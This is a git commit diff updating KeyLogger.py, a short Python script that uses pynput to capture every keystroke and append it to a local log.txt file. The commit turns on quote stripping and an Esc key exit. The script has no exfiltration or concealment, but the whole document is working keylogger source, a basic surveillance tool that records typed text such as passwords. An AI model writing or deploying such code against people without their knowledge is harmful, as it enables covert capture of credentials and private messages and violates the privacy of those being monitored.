5b9e511c9dfdf2911a68a24df4f84941d5daa65f
antonioam82 <32330632+antonioam82@users.noreply.github.com>
2019-12-02 11:50:44 +0100

    Update KeyLogger.py

--- KeyLogger.py
+++ KeyLogger.py
@@ -1,23 +1,18 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
 from pynput.keyboard import Listener
-#import sys
-
+import sys
 
 def capt(key):
     tecla = str(key)
-    #tecla = tecla.replace("'", "")
+    tecla = tecla.replace("'", "")
 
     if tecla == 'Key.space':
         tecla = ' '
-    if tecla == 'Key.shift_r':
-        tecla = ''
-    if tecla == "Key.ctrl_l":
-        tecla = ""
     if tecla == "Key.enter":
         tecla = "\n"
-    #if tecla == "Key.esc":
-        #sys.exit()
+    if tecla == "Key.esc":
+        sys.exit()
 
     with open("log.txt", 'a') as f:
         f.write(tecla)
